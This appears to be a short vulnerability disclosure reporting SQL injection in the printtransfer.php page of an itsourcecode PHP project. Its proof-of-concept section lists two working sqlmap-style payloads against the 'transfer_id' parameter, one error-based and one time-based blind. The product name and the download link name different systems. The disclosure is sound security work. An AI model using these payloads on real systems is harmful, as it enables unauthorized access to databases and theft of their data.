# Vendor

itsourcecode

# Product

Project Expense Monitoring System

# version

V1.0

# Download

https://itsourcecode.com/wp-content/uploads/2021/03/Construction-Management-System-Project-In-PHP-Source-Code.zip

# Vulnerability

SQLi

# Description

There is a SQLi injection vulnerability in the printtransfer.php page. An attacker can obtain sensitive data in the database by passing special SQL statements in the "$_GET['transfer_id']" parameter.
<img width="1526" alt="image" src="https://github.com/user-attachments/assets/f67e6501-a3b3-4d8e-a74d-2460cb5ad9e9">

# POC
```
Parameter: transfer_id (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: transfer_id=14' AND GTID_SUBSET(CONCAT(0x716b766271,(SELECT (ELT(7990=7990,1))),0x716a787871),7990)-- MmbY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transfer_id=14' AND (SELECT 8863 FROM (SELECT(SLEEP(5)))rlpX)-- XQNN
```
